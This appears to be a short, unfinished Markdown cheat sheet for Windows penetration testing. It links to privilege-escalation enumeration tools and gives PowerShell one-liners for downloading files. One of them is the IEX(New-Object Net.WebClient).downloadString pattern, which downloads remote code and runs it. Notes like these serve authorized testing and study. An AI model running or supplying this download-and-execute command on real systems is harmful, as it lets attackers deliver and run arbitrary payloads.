# Windows
**work in progress**

- [Windows](#windows)
  - [Enumeration](#enumeration-on-windows)
  - [Other](#other)
  - [Privilege Escalation](#)

## Enumeration on windows
Automated enumeration tools:
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [SharpUp](https://github.com/GhostPack/SharpUp)

## Other
Some useful stuff.

### Powershell: download files
```powershell
Invoke-WebRequest <URL> -Outfile <PATH>
```

### Powershell: download and execute file
```powershell
IEX(New-Object Net.WebClient).downloadString("URL")
```
